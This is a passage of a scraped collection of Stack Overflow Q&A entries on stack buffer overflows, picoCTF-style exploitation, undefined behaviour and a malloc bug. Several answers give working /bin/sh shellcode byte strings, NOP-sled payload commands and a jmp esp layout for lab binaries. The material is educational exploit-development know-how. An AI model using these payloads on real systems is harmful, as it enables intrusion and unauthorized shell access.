0xffffd9c4\n0xffffd450: 0xffffda14  0xffffda22  0xffffda33  0xffffda48\n0xffffd460: 0xffffda60  0xffffda6c  0xffffdaf0  0xffffdb01\n0xffffd470: 0xffffdb35  0xffffdb64  0xffffdbb0  0xffffdbbf\n0xffffd480: 0xffffdbd4  0xffffdbeb  0xffffdc09  0xffffdc1d\n0xffffd490: 0xffffdc25  0xffffdc3b  0xffffdc6d  0xffffdc78\n0xffffd4a0: 0xffffdc80  0xffffdc99  0xffffdcb4  0xffffdcbf\n0xffffd4b0: 0xffffdcd0  0xffffdcef  0xffffdd21  0xffffdd35\n0xffffd4c0: 0xffffdd53  0xffffdd6a  0xffffdd83  0xffffdda1\n0xffffd4d0: 0xffffde16  0xffffde2c  0xffffde3c  0xffffdf08\n0xffffd4e0: 0xffffdf1a  0xffffdf50  0xffffdf6c  0xffffdf84\n0xffffd4f0: 0xffffdf9b  0x00000000  0x00000020  0xf7ffc570\n0xffffd500: 0x00000021  0xf7ffc000  0x00000033  0x000006f0\n0xffffd510: 0x00000010  0xbfebfbff  0x00000006  0x00001000\n0xffffd520: 0x00000011  0x00000064  0x00000003  0x08048034\n0xffffd530: 0x00000004  0x00000020  0x00000005  0x00000009\n0xffffd540: 0x00000007  0x00000000  0x00000008  0x00000000\n0xffffd550: 0x00000009  0x08049660  0x0000000b  0x000003e8\n0xffffd560: 0x0000000c  0x000003e8  0x0000000d  0x000003e8\n0xffffd570: 0x0000000e  0x000003e8  0x00000017  0x00000000\n0xffffd580: 0x00000019  0xffffd5bb  0x0000001a  0x00000002\n0xffffd590: 0x0000001f  0xffffdfc1  0x0000000f  0xffffd5cb\n0xffffd5a0: 0x0000001b  0x0000001c  0x0000001c  0x00000020\n0xffffd5b0: 0x00000000  0x00000000  0x62000000  0x9e72e32a\n\n\nI'm using Python 3. The shell code is 25 bytes long. I have already disabled ASLR.\nThis is my code in C\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[100];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\n",
        "Answer": "Python3's string literals \"...\" default to UTF-8 (Unicode) encoding when printing, not 8-bit ASCII (ISO-8859-1/Latin-1). As a result extra characters are being output that renders your shellcode unusable.\nIf you were to run your Python command like:\npython -c 'print(\"\\x90\"*63 + \"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" + \"B\" * 20)' | hexdump -C\n\nPiping the output through hexdump can make the issue more obvious. The output will look something like:\n00000000  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c2 90  |................|\n*\n00000070  c2 90 c2 90 c2 90 c2 90  c2 90 c2 90 c2 90 c3 ab  |................|\n00000080  0b 5b 31 c3 80 31 c3 89  31 c3 92 c2 b0 0b c3 8d  |.[1..1..1.......|\n00000090  c2 80 c3 a8 c3 b0 c3 bf  c3 bf c3 bf 2f 62 69 6e  |............/bin|\n000000a0  2f 73 68 42 42 42 42 42  42 42 42 42 42 42 42 42  |/shBBBBBBBBBBBBB|\n000000b0  42 42 42 42 42 42 42 0a                           |BBBBBBB.|\n000000b8\n\nYou'll notice that the value C2 and C3 have been inserted into the middle of your code for those characters that are >= 0x80. As a result the output is no longer suitable as shellcode.\nIf you switch to using Python2 the problem would resolve itself since it doesn't default to a Unicode character set. Something that works for Python2 and Python3 is the use of byte string literals b'...' and use sys.stdout.buffer.write to output the bytes to standard output.\nA command like this should work in GDB:\nrun $(python -c \"import sys; sys.stdout.buffer.write(b'\\x90'*63 + b'\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68' + b'B' * 20)\")\n\n",
        "Source": "https://stackoverflow.com/questions/78100496/not-getting-the-expected-output-when-running-a-shell-code-in-a-buffer-overflow"
    },
    {
        "Title": "EIP doesn&#39;t get overwritten when perfoming a buffer overflow attack",
        "Question": "I was watching this video on youtube: https://www.youtube.com/watch?v=1S0aBV-Waeo and i was trying to do the same steps shown in the video, but i can't seem to overwrite the EIP. I don't know if it's because the gdb may have changed during the years, or if anything else has. What i get when i try to overflow is the following\nProgram received signal SIGSEGV, Segmentation fault.\n0x080491ac in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n\nI can't seem to overwrite the eip, no matter how large my input is. The code is the same as shown in the video with a smaller buffer size.\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char** argv){\n    char buffer[10];\n    strcpy(buffer, argv[1]);\n\n    return 0;\n}\n\nI also get asked the following when running my program in gdb for the first time\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \n\nThis is the register info in gdb\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b2          -10574\nedx            0xffffd396          -11370\nebx            0x804bff4           134529012\nesp            0xffffd390          0xffffd390\nebp            0xffffd3a8          0xffffd3a8\nesi            0xffffd480          -11136\nedi            0xf7ffcb60          -134231200\neip            0x80491a3           0x80491a3 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n\n(gdb) x/20x $esp\n0xffffd390: 0xffffffff  0x4141d3d4  0x41414141  0x41414141\n0xffffd3a0: 0xffff0041  0xf7e1fe2c  0x00000000  0xf7c20af9\n0xffffd3b0: 0x00000000  0x00000000  0x080482e7  0xf7c20af9\n0xffffd3c0: 0x00000002  0xffffd474  0xffffd480  0xffffd3e0\n0xffffd3d0: 0xf7e1fe2c  0x0804907d  0x00000002  0xffffd474\n\nI'm compiling with the following flags\ngcc -o example2 -fno-stack-protector -no-pie -m32 -g -z execstack example2.c -w\n\nThe whole interaction on gdb\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x080497d5 <+0>: lea    0x4(%esp),%ecx\n   0x080497d9 <+4>: and    $0xfffffff0,%esp\n   0x080497dc <+7>: push   -0x4(%ecx)\n   0x080497df <+10>:    push   %ebp\n   0x080497e0 <+11>:    mov    %esp,%ebp\n   0x080497e2 <+13>:    push   %ebx\n   0x080497e3 <+14>:    push   %ecx\n   0x080497e4 <+15>:    sub    $0x10,%esp\n   0x080497e7 <+18>:    call   0x804981c <__x86.get_pc_thunk.ax>\n   0x080497ec <+23>:    add    $0x9a808,%eax\n   0x080497f1 <+28>:    mov    %ecx,%edx\n   0x080497f3 <+30>:    mov    0x4(%edx),%edx\n   0x080497f6 <+33>:    add    $0x4,%edx\n   0x080497f9 <+36>:    mov    (%edx),%edx\n   0x080497fb <+38>:    sub    $0x8,%esp\n   0x080497fe <+41>:    push   %edx\n   0x080497ff <+42>:    lea    -0x12(%ebp),%edx\n   0x08049802 <+45>:    push   %edx\n   0x08049803 <+46>:    mov    %eax,%ebx\n   0x08049805 <+48>:    call   0x8049020\n   0x0804980a <+53>:    add    $0x10,%esp\n   0x0804980d <+56>:    mov    $0x0,%eax\n--Type <RET> for more, q to quit, c to continue without paging--\n   0x08049812 <+61>:    lea    -0x8(%ebp),%esp\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\nEnd of assembler dump.\n(gdb) break *0x08049805\nBreakpoint 1 at 0x8049805: file example.c, line 6.\n(gdb) break *0x08049812\nBreakpoint 2 at 0x8049812: file example.c, line 9.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/r3/buffer-overflows/bo in memory example/example AAAAAAAAAAAAAAAAAAAAAAAAA\n\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \nDebuginfod has been disabled.\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\n\nBreakpoint 1, 0x08049805 in main (argc=2, argv=0xffffd464) at example.c:6\n6       strcpy(buffer, argv[1]);\n(gdb) info reg\neax            0x80e3ff4           135151604\necx            0xffffd330          -11472\nedx            0xffffd306          -11514\nebx            0x80e3ff4           135151604\nesp            0xffffd2f0          0xffffd2f0\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049805           0x8049805 <main+48>\neflags         0x292               [ AF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd2f0: 0xffffd306  0xffffd6a4  0x00000000  0x080497ec\n0xffffd300: 0x080ade17  0x080e7c04  0x08049030  0x080ae037\n0xffffd310: 0xffffd330  0x080e3ff4  0xffffd428  0x08049ceb\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n(gdb) c\nContinuing.\n\nBreakpoint 2, main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b0          -10576\nedx            0xffffd312          -11502\nebx            0x80e3ff4           135151604\nesp            0xffffd300          0xffffd300\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049812           0x8049812 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd300: 0x080ade17  0x41417c04  0x41414141  0x41414141\n0xffffd310: 0x41414141  0x41414141  0x41414141  0x00414141\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n0xffffd340: 0x080e3ff4  0x0804968d  0x00000002  0xffffd464\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804981b in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0x41414141          1094795585\nedx            0xffffd312          -11502\nebx            0x41414141          1094795585\nesp            0x4141413d          0x4141413d\nebp            0x41414141          0x41414141\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x804981b           0x804981b <main+70>\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0x4141413d: Cannot access memory at address 0x4141413d\n(gdb) c\nContinuing.\n\nProgram terminated with signal SIGSEGV, Segmentation fault.\nThe program no longer exists.\n\n",
        "Answer": "This code\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\n\nrestores registers from their saved location on stack. However, you've overwritten the stack contents, so all the registers are now set to 0x4141... values. And that causes the lea    -0x4(%ecx),%esp instruction to SIGSEGV, since ECX points to inaccessible memory.\nAs ssbssa commented, this is happening due to stack realignment (which itself is needed to deal with 64-bit aligned (newer) AVX etc.).\nIf I turn stack realignment off with -mpreferred-stack-boundary=2, the code becomes:\n   0x08049176 <+0>:     push   %ebp\n   0x08049177 <+1>:     mov    %esp,%ebp\n   0x08049179 <+3>:     sub    $0xc,%esp\n   0x0804917c <+6>:     mov    0xc(%ebp),%eax\n   0x0804917f <+9>:     add    $0x4,%eax\n   0x08049182 <+12>:    mov    (%eax),%eax\n   0x08049184 <+14>:    push   %eax\n   0x08049185 <+15>:    lea    -0xa(%ebp),%eax\n   0x08049188 <+18>:    push   %eax\n   0x08049189 <+19>:    call   0x8049050 <strcpy@plt>\n   0x0804918e <+24>:    add    $0x8,%esp\n   0x08049191 <+27>:    mov    $0x0,%eax\n   0x08049196 <+32>:    leave\n   0x08049197 <+33>:    ret\n\nand the RIP overwrite works:\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) x/i $pc\n=> 0x41414141:  Cannot access memory at address 0x41414141\n\n",
        "Source": "https://stackoverflow.com/questions/78053915/eip-doesnt-get-overwritten-when-perfoming-a-buffer-overflow-attack"
    },
    {
        "Title": "Buffer Overflow: Why does buffer assignment impact other variables?",
        "Question": "\nvoid foo() {\n    int value = 0;\n    char buf[4];\n    buf[4] = 1;\n\n\n    printf(\"value: %d\\n\", value);\n}\n\nint main() {\n    foo();\n    return 0;\n}\n\n\n\nWhy does 'value' print 1?\nI believe this has to do with buffer overflow and little endian but I am finding it hard to grasp.\n",
        "Answer": "Because it is Undefined Behaviour.\nIt is enough to change the optimization options and you will get different results.\nGodbolt for example:\n\nWith -O0 : 1\nWith -Os : 0\n\nBut it does not have to be like this. It can end up in the segfault or something else may happen.\nhttps://godbolt.org/z/TEbWbMvsa\n\nI understand it's undefined behavior. I was just wondering how this is\nrelated to little endian. When I went past buf[3] into buf[4], it\nstarted changing the next byte in memory. How do I know the next byte\nin memory is 'value'?\n\nYou cant know it. Order is not specified. value can be optimized out and not stored on the stack at all. You need to know your ABI and compiler very well to predict it.\nIn your case:\n+ 0x07: value byte 4  MSB\n+ 0x06: value byte 3\n+ 0x05: value byte 2\n+ 0x04: value byte 1  LSB\n+ 0x03: buf[3]\n+ 0x02: buf[2]\n+ 0x01: buf[1]\n+ 0x00: buf[0]\n\n",
        "Source": "https://stackoverflow.com/questions/77937810/buffer-overflow-why-does-buffer-assignment-impact-other-variables"
    },
    {
        "Title": "ROP - The use of the jmp esp",
        "Question": "I was playing some picoCTF challenges today and I found myself stuck in a challenge.\nDigging around the internet, I found a solution online which I cannot fully grasp.\nThe challenge (whose name I won't spoil for those who are playing picoCTF) revolves around a vulnerable x86 ELF, and it involves using ROP gadgets to gain a shell, however the checksec reveals that the binary is not PIE, and there is no NX enabled.\nBy breaking at ret of the vulnerable function, I noticed that the EAX register contains the start address of the buffer on the stack. Moreover, I found out that the offset between the start of the buffer and the saved EIP is 28 bytes.\nSo my first guess was to craft a sufficiently short shellcode, place it inside the buffer preceeded by a NOP sled, and overwrite the saved EIP with a gadget jumping to the content of the EAX register, aka the start of my buffer.\nHowever, I found out that this approach is not working.\nThe shellcode I crafted is:\nint 0x3   ; used for debugging purposes\nxor eax, eax\npush eax\npush 0x0068732f\npush 0x6e69622f\nxor ebx, ebx\npush eax\npush ebx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n\nI assembled it using pwntool's asm library, setting the architecture to i386.\nThe debugger reveals the following after few steps in:\npwndbg> \n\nProgram received signal SIGSEGV, Segmentation fault.\n0xff854a01 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x80e5300 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088\n EDX  0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EBP  0x90909090\n ESP  0xff854a00 \u25c2\u2014 0x0\n EIP  0xff854a01 \u25c2\u2014 0x2f000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   0xff8549f3    push   eax\n   0xff8549f4    push   0x68732f\n   0xff8549f9    push   0x6e69622f\n   0xff8549fe    xor    ebx, ebx\n   0xff854a00    add    byte ptr [eax], al\n    \u2193\n \u25ba 0xff854a01    add    byte ptr [eax], al\n   0xff854a03    add    byte ptr [edi], ch\n   0xff854a05    bound  ebp, qword ptr [ecx + 0x6e]\n   0xff854a08    das    \n   0xff854a09    jae    0xff854a73                    <0xff854a73>\n    \u2193\n   0xff854a73    add    byte ptr [eax], al\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp eip-1 0xff854a00 \u25c2\u2014 0x0\n01:0004\u2502           0xff854a04 \u25c2\u2014 '/bin/sh'\n02:0008\u2502           0xff854a08 \u25c2\u2014 0x68732f /* '/sh' */\n03:000c\u2502           0xff854a0c \u25c2\u2014 0x0\n04:0010\u2502 edx       0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n... \u2193              2 skipped\n07:001c\u2502           0xff854a1c \u25c2\u2014 0x3e8\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba f 0 0xff854a01\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\npwndbg> \n\nMeaning that the execution is breaking at 0xff854a00.\nNow the solution I found online involved crafting the overflow string in the following way:\n\nWrite 6 NOPs.\nPlace the assembled instruction for jmp esp\nWrite 20 more NOPs.\nPlace the jmp eax gadget to jump to the start of the buffer, overwriting the saved EIP.\nAppend the shellcode.\n\nFrom what I've understood, the jmp ESP instruction allows to direct the execution right after the ret instruction, thus jumping inside the shellcode, but I would like to know more about this.\nI even tried recalling the x86 Call/Return Protocol, but it seems that I cannot fully grasp how jumping to the stack would actually resolve the challenge.\nI seek your help.\nThanks!\n",
        "Answer": "Your code is on the stack under the stack pointer. Part of it is overwritten by your own push instructions. Notice that bound ebp, qword ptr [ecx + 0x6e] has machine code 62 69 6E which corresponds to push 0x6e69622f. Adjusting esp downwards by a suitable amount should fix the problem, e.g. sub esp, 32\nThe other solution works around the problem by putting most of the shellcode above the stack pointer and only using a single jmp esp to transfer control. Here is an illustration of the memory layout:\n|    ...      |           |     ^       |\n|    ...      |           |     |       |\n|    ...      |           |     |       |\n|    ...      | <= ESP => |  shellcode  |\n+-------------+           +-------------+\n|  ret addr   |  jmp eax  |  ret addr   |\n+-------------+           +-------------+\n| pushed data |           | pushed data |\n|     |       |           |     |       |\n|     |       |           |     |       |\n|     v       |           |     v       |\n|  !overlap!  |           |    ...      |\n|     ^       |           |   jmp esp   |\n|     |       |           |    nop      |\n|     |       |           |    nop      |\n|  shellcode  | <= EAX => |    nop      |\n+-------------+           +-------------+\n\nThe initial nops are probably not needed, it should work fine with the jmp esp followed by 26 nops (or whatever padding since it's not going to be executed) instead.\n",
        "Source": "https://stackoverflow.com/questions/77832621/rop-the-use-of-the-jmp-esp"
    },
    {
        "Title": "why is my malloc(1) segfaulting my program?",
        "Question": "I have a problem in my C program that makes it so that it segfaults on malloc(1). I've spent many hours trying to find out why it segfaults but\nI just can't figure it out. This portion of my program separates strings using identifiers. Example, string=\"12wo4ne53wone86wo99w5ne\"; identifiers, start=\"wo\", end=\"ne\"; would return {\"wo4ne\", \"wone\", \"wo99w5ne\"}.\nMy code is as follows.\n// basically like substring() in java\nchar* stringAt(char* str, int start, int end) {\n    int length = end - start + 1;\n    int temp = start;\n    char* savedChar = NULL;\n    savedChar = malloc(length + 1);\n    for(int x = 0; x < length; x++) {\n        savedChar[x] = str[temp];\n        temp++;\n    }\n    savedChar[length] = '\\0';\n    return savedChar;\n}\n\n// finds \"identifier\" in string after certain position in that string\nint findIdentifier(char* str, char* identifier, int pos, int isEnd) {\n\n    // checks first character with first character in \"identifier\"\n    for(int x = pos; x < strlen(str) - 1; x++) {\n        if(str[x] == identifier[0]) {\n\n            // if first characters match then check rest\n            for(int i = 0; i < strlen(identifier); i++) {\n                if(str[x + i] != identifier[i]) {\n                    i = strlen(identifier);\n                }\n                if(i == strlen(identifier) - 1) {\n\n                    // isEnd checks if you should count the last position of the identifier...\n                    // -like ident=\"1234\" then \"end\" is the position of \"4\".\n                    // -not end be the position of \"1\"\n                    if(isEnd == 1) {\n                        return x + strlen(identifier) - 1;\n                    }\n                    return x;\n                }\n            }\n        }\n    }\n    return -1;\n}\n\nchar** separateStrings(char* str, char* identifier, char* lastIdentifier) {\n    char** savedStr = NULL;\n\n    // segfault here!\n    savedStr = malloc(1);\n    // segfualt here!\n\n    int start = -2;\n    int end = 0;\n    int x = 0;\n    do {\n\n    // first run check/gets first and last positions of the identifier in the string\n    if(start == -2) {\n        start = findIdentifier(str, identifier, 0, 0);\n    } else {\n    start = findIdentifier(str, identifier, end + 1, 0);\n    }\n    end = findIdentifier(str, lastIdentifier, start + 1, 1);\n    \n    if(start != -1) {\n        if(end == -1) {\n            end = strlen(str);\n        }\n        char* newStr = stringAt(str, start, end);\n\n        // dynamically increase the size of savedStr (x is iterated every run through here)\n        realloc(savedStr, x + 1);\n        savedStr[x] = malloc(strlen(newStr) + 1);\n        strcpy(savedStr[x], newStr);\n        x++;\n    }\n\n    } while(start != -1 && end != -1);\n    return savedStr;\n}\n\nI have tried looking up why this could not be working and the only thing I can think of is a Buffer Overflow. So I then tried to run findIdentifier() many times but that works fine.\nThe program is also inconsistent and sometimes runs farther into the code than others but is accurate with its outcomes.\n",
        "Answer": "If savedStr is supposed to be a dynamically allocated array of strings, then allocating 1 byte of memory is not sufficient to store a pointer to a char (depending on your platform, this requires either 4 or 8 bytes).\nEven when you realloc it to be larger, you're only adding 1 byte at a time. This when you reference and assign with savedStr[x] = malloc(strlen(newStr) + 1); you're invoking undefined behavior, which in this case it would seem has manifested as a segmentation fault.\nYou almost certainly want to allocate:\nsavedStr = malloc(sizeof(char *));\n\nAnd then when you re-allocate:\nrealloc(savedStr, (x + 1) * sizeof(char *));\n\nBut you also want to capture the pointer realloc returns. If you're not too worried about allocation error checking:\nsavedStr = realloc(savedStr, (x + 1) * sizeof(char *));\n\nBreaking out the dynamically resized string vector problem\nOne of the core problems your code solves is having an array that grows dynamically. If you break this bit of code out, then you can approach the remainder of your program without worrying about the memory management.\nThe size of the array doubles when needed rather than growing by a single entry to minimize allocations. There may be more ideal growth factors for efficiency.\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstruct string_vec {\n    char **data;\n    size_t cap;\n    size_t sz;\n};\n\nstruct string_vec *string_vec_new(size_t cap) {\n    struct string_vec *vec = malloc(sizeof(struct string_vec));\n    if (!vec) return NULL;\n\n    *vec = (struct string_vec){\n        .data = malloc(sizeof(char *) * cap),\n        .cap = cap,\n        .sz = 0\n    };\n\n    